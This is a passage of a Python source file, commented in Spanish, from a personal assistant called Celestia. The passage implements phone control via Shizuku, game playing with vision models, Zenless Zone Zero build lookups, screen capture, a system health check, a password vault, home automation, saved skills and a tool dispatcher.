            return f"🌑 Brillo al mínimo... [BRIGHTNESS:1]"
        m = re.match(r"(\d{1,3})%?$", n)
        if m:
            pct = max(0, min(100, int(m.group(1))))
            val = int(pct * 255 / 100)
            return f"☀️ Brillo al {pct}%... [BRIGHTNESS:{val}]"
        return f"No entiendo el nivel de brillo «{nivel}»."

    def cerrar_app(self, app: str) -> str:
        """Cierra una app vía force-stop. Sólo funciona si Shizuku activo
        — el bridge ejecutará rish. Sin Shizuku, el bridge cae a HOME (no
        cierra de verdad pero al menos no miente).

        Sesión 63: usa el MISMO resolvedor que `abrir_app`. Tenía una copia
        propia del mapa, más pobre y ya divergida —sin Netflix, sin los juegos,
        sin los alias coloquiales, y sin mirar los paquetes instalados—, así que
        Celestia abría apps que luego no sabía cerrar.
        """
        pkg = self._resolver_app(app)
        if not pkg:
            disponibles = ", ".join(sorted(self._APP_MAP.keys())[:10])
            return (f"No conozco la app '{app}'. Algunas que sí: {disponibles}. "
                    f"También vale el nombre del paquete entero.")
        return f"✅ Cerrando {app}... [CLOSE_APP:{pkg}]"

    def zzz(self, consulta: str = "") -> str:
        """Equipos y builds de Zenless Zone Zero, con el meta del día.

        Enzo (6 sep 2026): «quiero que también sepa hacer equipos, las mejores
        combinaciones y mejores builds para los personajes» y, sobre de dónde
        sacar el meta, «para eso tiene acceso a Google, puede buscar y tener
        siempre lo más nuevo».

        Todo el saber vive en `celestia_lib/zzz.py` y se descarga de las guías,
        con su fecha y su fuente. Aquí solo se pasa la pregunta. Va en las
        respuestas directas porque lo que devuelve son datos leídos de una web
        concreta un día concreto: pasarlos por el modelo es invitarle a
        cambiarlos, y un W-Engine cambiado es un consejo falso.
        """
        from celestia_lib.zzz import responder
        try:
            return responder(consulta)
        except Exception as e:
            logger.warning("zzz falló: %s", e)
            return ("No he podido consultar el meta de ZZZ ahora mismo "
                    f"({type(e).__name__}). Vuelve a intentarlo en un rato.")

    @staticmethod
    def _saber_del_juego(objetivo: str) -> str:
        """Lo leído sobre cómo se juega a esto, si es un juego del que sabe algo.

        Hoy sólo ZZZ tiene tutorial leído. Se pregunta por el nombre y no se
        fuerza: un juego del que no ha leído nada se juega igual, sólo que sin
        esa ayuda. Y **no sale a la red desde aquí**: usa lo que ya esté
        guardado, porque esto corre justo antes de empezar una partida.
        """
        bajo = (objetivo or "").lower()
        if "zzz" not in bajo and "zenless" not in bajo:
            return ""
        try:
            from celestia_lib.zzz import SaberZZZ
            return SaberZZZ().resumen_para_jugar()
        except Exception as e:
            logger.debug("no pude traer lo que sé de %s: %s", objetivo, e)
            return ""

    @staticmethod
    def _escuela_del_juego(objetivo: str) -> Optional[Any]:
        """La escuela de este juego, o `None` si no se puede montar.

        `None` no rompe nada: el jugador comprueba que la tiene antes de
        usarla, y sin ella se juega como se jugaba antes — pensando cada
        pantalla desde cero. Aprender es una mejora, no un requisito.
        """
        try:
            from celestia_lib.escuela import escuela_del_juego
            return escuela_del_juego(objetivo)
        except Exception as e:
            logger.debug("no pude montar la escuela de %s: %s", objetivo, e)
            return None

    def jugar(self, objetivo: str = "", aparato: str = "movil",
              segundos: int = 90) -> str:
        """Juega por Enzo a lo que tenga abierto en la pantalla.

        Enzo (6 sep 2026): «quiero que juegue por mí en un juego». Lo que hay
        detrás está en `celestia_lib/jugador.py`; aquí solo se monta la partida
        y se cuenta lo que pasó.

        El tope de tiempo por defecto es corto a propósito: al otro lado hay
        alguien esperando en un chat, y una partida que no contesta en minuto y
        medio parece colgada aunque esté jugando. Para sesiones largas, se pide
        expresamente.
        """
        from celestia_lib.jugador import (Cronometro, Jugador, LibroDeJugadas,
                                          Limites, Ojo, _sin_acentos,
                                          mando_del_aparato, mirada_en_cadena,
                                          pensador_groq)
        objetivo = (objetivo or "").strip()
        if not objetivo:
            return ("¿A qué juego y qué quieres que consiga? Dímelo como se lo "
                    "dirías a alguien: «juega por mí al solitario y gana la partida».")

        mando = mando_del_aparato(aparato)
        puedo, motivo = mando.disponible()
        if not puedo:
            return f"No puedo jugar ahora mismo: {motivo}"

        clave = self.orch.config.GROQ_API_KEY if getattr(self, "orch", None) else ""
        if not clave:
            clave = os.environ.get("GROQ_API_KEY", "")
        # La reserva para la vista. No es obligatoria: sin ella se juega igual,
        # sólo que cuando Groq sature habrá que leer la pantalla con OCR.
        clave_or = (self.orch.config.OPENROUTER_API_KEY
                    if getattr(self, "orch", None) else "")
        if not clave_or:
            clave_or = os.environ.get("OPENROUTER_API_KEY", "")
        clave_gem = (self.orch.config.GEMINI_API_KEY
                     if getattr(self, "orch", None) else "")
        if not clave_gem:
            clave_gem = os.environ.get("GEMINI_API_KEY", "")
        clave_mistral = (self.orch.config.MISTRAL_API_KEY
                         if getattr(self, "orch", None) else "")
        if not clave_mistral:
            clave_mistral = os.environ.get("MISTRAL_API_KEY", "")
        if not clave:
            return ("Para jugar necesito el modelo rápido de Groq y no encuentro la "
                    "clave. Sin ella tendría que pensar cada jugada con algo mucho "
                    "más lento, y llegaría tarde a todo.")

        # Un libro por objetivo: lo aprendido jugando al solitario no vale para
        # otro juego, y mezclarlo haría que se tocara donde no toca.
        slug = re.sub(r"[^a-z0-9]+", "_", _sin_acentos(objetivo.lower()))[:40] or "partida"
        libro_dir = MEM_DIR / "jugador"
        crono = Cronometro()
        jugador = Jugador(
            mando, pensador_groq(clave), ojo=Ojo(),
            libro=LibroDeJugadas(libro_dir / f"{slug}.json"), crono=crono,
            # Con ojos (sesión 61): entender la pantalla pasa de ~15 s de OCR a
            # medio segundo. Si la mirada falla, el camino viejo sigue debajo.
            # Y con DOS sitios a los que preguntar (S65): con Groq saturado
            # —cinco 429 en 98 s, medido— el ojo se quedaba ciego y la partida
            # entera se jugaba a 60 s por vuelta. OpenRouter tarda 2,1 s, que
            # son treinta veces menos que el OCR.
            # Cuatro ojos, no dos. Ninguno da para una partida él solo: Groq
            # acepta ~6 miradas por minuto (7.000 tokens de entrada, 1.024 por
            # pantalla) y Gemini 20. Sumados —con Mistral `pixtral`, medido a
            # 576 ms— el jugador deja de quedarse ciego a la tercera jugada.
            mirar=mirada_en_cadena(clave, clave_or, clave_gem, clave_mistral,
                                   os.environ.get("CEREBRAS_API_KEY", ""),
                                   os.environ.get("SAMBANOVA_API_KEY", "")),
            # Y lo que haya leído de cómo se juega a esto. Enzo, 8 sep 2026:
            # «tiene que saber jugar, si no sabe cómo va que vea un tutorial».
            # Si no ha leído nada, va vacío y se juega como antes.
            saber=self._saber_del_juego(objetivo),
            # Y la escuela de este juego: lo que ha aprendido pantalla a
            # pantalla en las partidas anteriores. Enzo, 8 sep 2026: «cuando
            # vea algo nuevo busque cómo funciona … y ya cuando sepa todo pues
            # lo haga natural sin buscar». Se construye aquí y no dentro del
            # jugador porque es quien sabe a qué juego se está jugando.
            escuela=self._escuela_del_juego(objetivo),
        )
        limites = Limites(max_jugadas=40, max_segundos=max(10, min(600, int(segundos))))
        r = jugador.jugar(objetivo, limites)

        partes = [f"Jugué {r['jugadas']} jugadas en {r.get('segundos', 0)} s. "
                  f"Paré porque {r['motivo']}."]
        if r.get("bitacora"):
            partes.append("Lo que hice:")
            partes += [f"  {i+1}. {b}" for i, b in enumerate(r["bitacora"][:8])]
        # Lo que ha aprendido esta partida. Importa contarlo: es la diferencia
        # entre «jugó otra vez» y «ahora sabe una cosa más que antes».
        if r.get("aprendido"):
            partes.append(r["aprendido"] + ".")
        # Por qué fue lento, si lo fue. Callarlo hace parecer que el jugador
        # es así de lento, cuando lo que pasó es que se quedó sin vista rápida.
        if r.get("aviso"):
            # `.capitalize()` no: baja el resto de la cadena y deja «ocr»
            # donde el aviso decía «OCR».
            aviso = r["aviso"]
            partes.append(aviso[:1].upper() + aviso[1:] + ".")
        if r.get("ritmo"):
            partes.append(r["ritmo"])
        return "\n".join(partes)

    def control_movil(self, aparato: str = "movil") -> str:
        """¿Puedo manejar este aparato ahora mismo? La respuesta, comprobada.

        Sesión 61. Enzo encendió Shizuku y preguntó si podía tocar la pantalla;
        Celestia contestó **que no** teniéndolo delante y funcionando — el
        modelo improvisó, porque ninguna herramienta cubría la pregunta. Es el
        tercer sitio donde pasa lo mismo (ver la sesión 58 en `jugador.py` y el
        panel de estado en `api.py`): decir que no se puede lo que sí se puede
        es peor que no saber, porque cierra el asunto.

        Esto no adivina: le pregunta al aparato. Y no es el diagnóstico entero
        de `jugador.diagnostico()`, que mide capturas y OCR y tarda medio
        minuto tocando la pantalla — aquí se responde a «¿puedes?», no a
        «¿cómo de rápido?».
        """
        from celestia_lib.jugador import mando_del_aparato

        try:
            mando = mando_del_aparato(aparato)
            puedo, motivo = mando.disponible()
        except Exception as e:
            return f"No he podido comprobarlo: {e}"

        # El parámetro viene sin tilde (es una clave, no texto); lo que se le
        # dice a Enzo se escribe bien.
        nombre = {"movil": "móvil", "pc": "PC"}.get(aparato.lower(), aparato)

        try:
            if not puedo:
                return (f"Ahora mismo **no** puedo manejar tu {nombre}: {motivo}\n\n"
                        "En cuanto esté, puedo tocar, deslizar, escribir, leer la "
                        "pantalla y jugar por ti.")

            canal = getattr(mando, "canal", "") or "directo"
            try:
                an, al = mando.resolucion()
                pantalla = f"{an}×{al}"
            except Exception:
                pantalla = "no he podido medirla"
        finally:
            # Una pregunta no deja canales abiertos, se conteste que sí o que no.
            try:
                mando.cerrar()
            except Exception:
                pass

        # El canal manda sobre lo que se puede prometer, así que se dice.
        if canal == "rish":
            velocidad = ("Voy por Shizuku, que es el camino lento: unos 116 ms "
                         "por orden (medidos). Da de sobra para menús, farmeo y "
                         "turnos; para un juego de reflejos, no.")
        elif canal == "adb":
            velocidad = ("Voy por adb, que es el camino rápido: decenas de "
                         "milisegundos por orden.")
        else:
            velocidad = ""

        return (f"Sí, puedo manejar tu {nombre} ahora mismo.\n\n"
                f"• Pantalla: {pantalla}\n"
                f"• Canal: {canal}\n"
                f"• Sé tocar, deslizar, escribir, pulsar teclas, ver la pantalla "
                f"y leer lo que pone.\n\n"
                f"{velocidad}").strip()

    def capturar_pantalla(self) -> str:
        """Captura la pantalla. Soporta termux-screencap (Termux/Android),
        scrot/import (Linux con X), y screencapture (macOS). Si ninguno
        existe (p.ej. proot sin acceso al display), explica el porqué."""
        ts = int(time.time())
        destino_dirs = [
            IMAGENES_DIR,
            Path("/tmp"),
        ]
        destino = next((d for d in destino_dirs if d.parent.exists()), Path("/tmp"))
        destino.mkdir(parents=True, exist_ok=True)
        ruta = destino / f"pantalla_{ts}.png"

        if not ES_ANDROID:
            # Windows y Mac (y Linux con X) sin programas aparte: con Pillow,
            # que ya va en el instalador. En Windows no había ningún camino.
            from . import pc
            png = pc.captura()
            if png:
                ruta.write_bytes(png)
                return f"__IMAGEN__:{ruta}|✓ Captura de la pantalla ({len(png) // 1024}KB)"

        candidatos = [
            ("termux-screencap", [str(ruta)]),
            ("screencapture", ["-x", str(ruta)]),
            ("scrot", [str(ruta)]),
            ("import", ["-window", "root", str(ruta)]),
        ]
        for cmd, args in candidatos:
            ruta_bin = shutil.which(cmd)
            if not ruta_bin:
                continue
            try:
                proc = subprocess.run(
                    [ruta_bin, *args], capture_output=True, text=True, timeout=15
                )
                if proc.returncode == 0 and ruta.exists() and ruta.stat().st_size > 0:
                    kb = ruta.stat().st_size // 1024
                    return f"__IMAGEN__:{ruta}|✓ Captura tomada con {cmd} ({kb}KB)"
                err = (proc.stderr or "").strip()
                return f"✗ {cmd} falló (rc={proc.returncode}): {err[:200]}"
            except subprocess.TimeoutExpired:
                return f"✗ {cmd} superó el tiempo límite (15s)."
            except Exception as e:
                return f"✗ Error ejecutando {cmd}: {e}"

        return (
            "✗ No tengo comando de captura disponible en este entorno "
            "(probé termux-screencap, screencapture, scrot, import). "
            "Si usas WhatsApp con el bridge activo, ahí sí "
            "puedo capturar y analizar la pantalla del móvil."
        )

    def guardian_sistema(self) -> str:
        alertas, estado = [], []

        # RAM
        try:
            with open("/proc/meminfo", encoding="utf-8") as f:
                mem = {k.strip(): v.strip() for line in f if ":" in line
                       for k, v in [line.split(":", 1)]}
            total = int(mem.get("MemTotal", "0 kB").split()[0])
            avail = int(mem.get("MemAvailable", "0 kB").split()[0])
            uso_pct = (1 - avail / total) * 100 if total else 0
            estado.append(f"RAM: {uso_pct:.0f}% usada ({avail // 1024}MB libre)")
            if uso_pct > 85:
                alertas.append(f"⚠ RAM crítica: {uso_pct:.0f}% en uso")
        except Exception:
            pass

        # CPU
        try:
            with open("/proc/loadavg", encoding="utf-8") as f:
                load1 = float(f.read().split()[0])
            ncpu = os.cpu_count() or 1
            estado.append(f"CPU: carga {load1:.2f} ({load1/ncpu*100:.0f}% de {ncpu} núcleos)")
            if load1 / ncpu > 0.9:
                alertas.append(f"⚠ CPU saturada: carga {load1:.2f}")
        except Exception:
            pass

        # Disco interno y sdcard
        for ruta in ["/", "/sdcard"]:
            try:
                r = subprocess.run(["df", "-h", ruta], capture_output=True, text=True, timeout=5)
                for line in r.stdout.strip().splitlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 5:
                        pct = int(parts[4].rstrip("%"))
                        estado.append(f"Disco {ruta}: {parts[4]} usado ({parts[3]} libre)")
                        if pct > 90:
                            alertas.append(f"⚠ Disco {ruta} casi lleno: {parts[4]} usado")
            except Exception:
                pass

        # Batería (Android)
        try:
            bat_paths = [
                "/sys/class/power_supply/battery/capacity",
                "/sys/class/power_supply/BAT0/capacity",
            ]
            for bp in bat_paths:
                if os.path.exists(bp):
                    nivel = int(open(bp).read().strip())
                    estado_bat = ""
                    sp = bp.replace("capacity", "status")
                    if os.path.exists(sp):
                        estado_bat = f" — {open(sp).read().strip()}"
                    estado.append(f"Batería: {nivel}%{estado_bat}")
                    if nivel < 15:
                        alertas.append(f"⚠ Batería baja: {nivel}%")
                    break
        except Exception:
            pass

        # Temperatura CPU (Android)
        try:
            temp_paths = [
                "/sys/class/thermal/thermal_zone0/temp",
                "/sys/devices/virtual/thermal/thermal_zone0/temp",
            ]
            for tp in temp_paths:
                if os.path.exists(tp):
                    temp = int(open(tp).read().strip()) / 1000
                    estado.append(f"Temperatura CPU: {temp:.1f}°C")
                    if temp > 65:
                        alertas.append(f"⚠ CPU muy caliente: {temp:.1f}°C")
                    break
        except Exception:
            pass

        resultado = "\n".join(estado) if estado else "No se pudo leer el estado del sistema."
        if alertas:
            resultado += "\n\n🚨 ALERTAS:\n" + "\n".join(alertas)
        else:
            resultado += "\n\n✅ Sistema en buen estado."
        return resultado

    # ── Contraseñas ───────────────────────────────────────────────────────────
    def vault_guardar(self, sitio: str, usuario: str, password: str, nota: str = "") -> str:
        return self._vault.guardar(sitio, usuario, password, nota)

    def vault_obtener(self, sitio: str) -> str:
        return self._vault.obtener(sitio)

    def vault_listar(self) -> str:
        return self._vault.listar()

    def vault_eliminar(self, sitio: str) -> str:
        return self._vault.eliminar(sitio)

    # ── Domótica ──────────────────────────────────────────────────────────────
    def domotica_encender(self, dispositivo: str) -> str:
        return self._domotica.ejecutar(dispositivo, "encender")

    def domotica_apagar(self, dispositivo: str) -> str:
        return self._domotica.ejecutar(dispositivo, "apagar")

    def domotica_ajustar(self, dispositivo: str, valor: int) -> str:
        return self._domotica.ejecutar(dispositivo, "ajustar", int(valor))

    def domotica_estado(self, dispositivo: str) -> str:
        return self._domotica.ejecutar(dispositivo, "estado")

    def domotica_registrar(self, nombre: str, ip: str = "",
                           protocolo: str = "", tipo: str = "dispositivo") -> str:
        return self._domotica.registrar(nombre, ip, protocolo, tipo)

    def domotica_listar(self) -> str:
        return self._domotica.listar()

    def listar_habilidades(self) -> str:
        """Lista los skills .py guardados en SKILLS_DIR."""
        if not SKILLS_DIR.exists():
            return "No tengo habilidades guardadas aún."
        skills = sorted(SKILLS_DIR.glob("*.py"))
        if not skills:
            return ("No tengo habilidades guardadas aún. Pídeme 'aprende a hacer X' "
                    "para que aprenda una nueva.")
        lineas = ["Mis habilidades guardadas:"]
        for s in skills:
            desc = s.stem
            try:
                for l in s.read_text(encoding="utf-8").splitlines()[:3]:
                    if "DESCRIPCION" in l:
                        desc = l.replace("# DESCRIPCION: ", "").strip()
                        break
            except Exception:
                pass
            lineas.append(f"• {s.stem}: {desc}")
        lineas.append(f"\nTotal: {len(skills)} habilidad(es).")
        return "\n".join(lineas)

    def aprender_habilidad(self, tarea: str) -> str:
        """Stub: aprender requiere LLM. El orchestrator (modo API/WhatsApp) lo
        maneja. En el CLI conversacional devolvemos una guía clara."""
        return (
            f"Para aprender '{tarea}' necesito el modo API o WhatsApp con LLM activo. "
            "En el CLI puedes definir el skill manualmente en "
            f"{SKILLS_DIR}/ como un .py."
        )

    def usar_habilidad(self, nombre: str) -> str:
        """Ejecuta una habilidad guardada por nombre (match aproximado por stem)."""
        if not SKILLS_DIR.exists():
            return "No tengo habilidades guardadas aún."
        skills = list(SKILLS_DIR.glob("*.py"))
        if not skills:
            return "No tengo habilidades guardadas aún."
        clave = re.sub(r"\W+", "", (nombre or "").lower())
        if not clave:
            # Sin clave, el `in` matchearía la primera skill (string vacío
            # es substring de todo) y la ejecutaría sin que el usuario la
            # haya pedido. Bug visto sesión 28.
            return "Dime qué habilidad quieres usar (nombre)."
        candidata = elegir_habilidad(nombre, skills)
        if not candidata:
            return f"No encontré una habilidad llamada '{nombre}'."
        try:
            proc = subprocess.run(
                [sys.executable, str(candidata), nombre],
                capture_output=True, text=True, timeout=30,
            )
            out = (proc.stdout or "").strip()
            err = (proc.stderr or "").strip()
            if proc.returncode == 0:
                return out or f"✓ Habilidad '{candidata.stem}' ejecutada sin salida."
            return f"✗ Habilidad '{candidata.stem}' falló (rc={proc.returncode}):\n{err[:400]}"
        except subprocess.TimeoutExpired:
            return f"✗ Habilidad '{candidata.stem}' superó el tiempo límite (30s)."
        except Exception as e:
            return f"✗ Error ejecutando habilidad: {e}"

    # Las que manejan el móvil por Shizuku. Fuera de Android contestaban
    # «✅ Abriendo whatsapp» con una marca [OPEN_APP:…] que nadie ejecuta:
    # decía que lo había hecho sin hacerlo (visto en un Linux sin móvil, 3 oct 2026).
    _SOLO_ANDROID = frozenset({
        "abrir_app", "cerrar_app", "jugar", "llamar", "enviar_mensaje",
        "toggle_wifi", "toggle_bluetooth", "toggle_linterna", "toggle_avion",
        "cambiar_volumen", "cambiar_brillo", "tarea_autonoma",
    })

    # De ésas, las que en un ordenador sí tienen sentido y hace pc.py.
    _EN_UN_PC = frozenset({"abrir_app", "cerrar_app", "cambiar_volumen"})

    @staticmethod
    def _no_es_android(tool: str) -> str:
        sistema = {"win32": "Windows", "darwin": "un Mac"}.get(sys.platform, "un ordenador")
        que = ("jugar por ti" if tool == "jugar"
               else "manejar apps, llamadas y ajustes del aparato")
        return (f"Eso no puedo hacerlo aquí: {que} sólo funciona cuando vivo en un "
                f"móvil Android con Shizuku, y ahora estoy en {sistema}.")

    def execute(self, intent: Dict) -> str:
        tool = intent["tool"]
        params = intent.get("params", {})
        dispatch = {
            "buscar_web":           lambda: self.buscar_web(**params),
            "info_archivo":         lambda: self.info_archivo(**params),
            "consultar_memoria":    lambda: self.consultar_memoria(**params),
            "contar_letras":        lambda: self.contar_letras(**params),
            "contar_palabras":      lambda: self.contar_palabras(**params),
            "longitud_texto":       lambda: self.longitud_texto(**params),
            "silabas":              lambda: self.silabas(**params),
            "calcular":             lambda: self.calcular(**params),
            "porcentaje":           lambda: self.porcentaje(**params),
            "convertir_divisa":     lambda: self.convertir_divisa(**params),
            "buscar_noticias":      lambda: self.noticias(**params),
            "consultar_clima":      lambda: self.consultar_clima(**params),
            "info_sistema":         lambda: self.info_sistema(),
            "listar_archivos":      lambda: self.listar_archivos(**params),
            "leer_archivo":         lambda: self.leer_archivo(**params),
            "buscar_archivos":      lambda: self.buscar_archivos(**params),
            "ejecutar_comando":     lambda: self.ejecutar_comando(**params),
            "crear_archivo":        lambda: self.crear_archivo(**params),
            "borrar":               lambda: self.borrar(**params),
            "recordatorio":         lambda: self.recordatorio(**params),
            "listar_recordatorios": lambda: self.listar_recordatorios(),
            "borrar_recordatorio":  lambda: self.borrar_recordatorio(**params),
            "descargar_archivo":    lambda: self.descargar_archivo(**params),
            "buscar_duplicados":    lambda: self.buscar_duplicados(**params),
            "organizar_archivos":   lambda: self.organizar_archivos(**params),
            "abrir_app":            lambda: self.abrir_app(**params),
            "zzz":                  lambda: self.zzz(**params),
            "jugar":                lambda: self.jugar(**params),
            "capturar_pantalla":    lambda: self.capturar_pantalla(),
            "control_movil":        lambda: self.control_movil(**params),
            "guardian_sistema":     lambda: self.guardian_sistema(),
            "domotica_encender":    lambda: self.domotica_encender(**params),
            "domotica_apagar":      lambda: self.domotica_apagar(**params),
            "domotica_ajustar":     lambda: self.domotica_ajustar(**params),
            "domotica_estado":      lambda: self.domotica_estado(**params),
            "domotica_registrar":   lambda: self.domotica_registrar(**params),
            "domotica_listar":      lambda: self.domotica_listar(),
            "generar_imagen":       lambda: self.generar_imagen(**params),
            "enviar_archivo":       lambda: self.enviar_archivo(**params),
            "crear_documento":      lambda: self.crear_documento(**params),
            "tarea_autonoma":       lambda: "delegado",
            "vault_guardar":        lambda: self.vault_guardar(**params),
            "vault_obtener":        lambda: self.vault_obtener(**params),
            "vault_listar":         lambda: self.vault_listar(),
            "vault_eliminar":       lambda: self.vault_eliminar(**params),
            "vault_inicializar":    lambda: "delegado",
            "vault_desbloquear":    lambda: "delegado",
            "vault_exportar_usb":   lambda: "delegado",
            "vault_desbloquear_usb": lambda: "delegado",
            "vault_listar_usbs":    lambda: "\n".join(GestorContrasenas.detectar_usbs())
                                              or "No detecté ningún USB conectado.",
            "listar_habilidades":   lambda: self.listar_habilidades(),
            "aprender_habilidad":   lambda: self.aprender_habilidad(**params),
            "usar_habilidad":       lambda: self.usar_habilidad(**params),
            # Sesión 31: cerrar app (force-stop si Shizuku activo).
            "cerrar_app":           lambda: self.cerrar_app(**params),
            # Sesión 31 (BUG-S73): respuesta clara sobre falta de recurrencia.
            "recordatorio_recurrente_no_soportado": lambda: (
                "Los recordatorios recurrentes (todos los lunes, cada día, "
                "etc.) aún no están implementados. Puedo programarte uno "
                "único — dime «recuérdame el lunes a las 9» o «recuérdame "
                "mañana a las 22» — o pídemelo cada vez que lo necesites."
            ),
            # Sesión 32 (BUG-S108): hora en otra ciudad.
            "hora_ciudad":          lambda: self.hora_ciudad(**params),
            # Sesión 32 (BUG-S132): comunicación con contactos / web.
            "llamar":               lambda: self.llamar(**params),
            "enviar_mensaje":       lambda: self.enviar_mensaje(**params),
            "abrir_url":            lambda: self.abrir_url(**params),
            # Sesión 32 (BUG-S134): controles del dispositivo.
            "toggle_wifi":          lambda: self.toggle_wifi(**params),
            "toggle_bluetooth":     lambda: self.toggle_bluetooth(**params),
            "toggle_linterna":      lambda: self.toggle_linterna(**params),
            "toggle_avion":         lambda: self.toggle_avion(**params),
            "cambiar_volumen":      lambda: self.cambiar_volumen(**params),
            "cambiar_brillo":       lambda: self.cambiar_brillo(**params),
            # Sesión 33: días hasta fechas señaladas (navidad, año nuevo, etc.).
            "dias_hasta":           lambda: self.dias_hasta(**params),
        }
        fn = dispatch.get(tool)
        if fn is None:
            return f"Herramienta desconocida: {tool}"
        if tool in self._EN_UN_PC and not ES_ANDROID:
            # En un ordenador, abrir/cerrar programas y el volumen los hace pc.py
            # (4 oct 2026; antes contestaba «sólo funciona en un móvil»).
            from . import pc
            hacer_en_pc = {"abrir_app": lambda: pc.abrir(params.get("app", "")),
                           "cerrar_app": lambda: pc.cerrar(params.get("app", "")),
                           "cambiar_volumen": lambda: pc.volumen(params.get("accion", "up"))}
            with actividad.fase(*_fase_de_tool(tool)):
                return hacer_en_pc[tool]()
        if tool in self._SOLO_ANDROID and not ES_ANDROID:
            return self._no_es_android(tool)
        try:
            # El logo del chat cambia de estado con esto: sin la marca, mientras
            # consulta el tiempo o escribe un PDF el spinner pondría
            # «escribiendo», que es justo lo que no está haciendo.
            with actividad.fase(*_fase_de_tool(tool)):
                return fn()
        except Exception as e:
            return f"Error en {tool}: {e}"


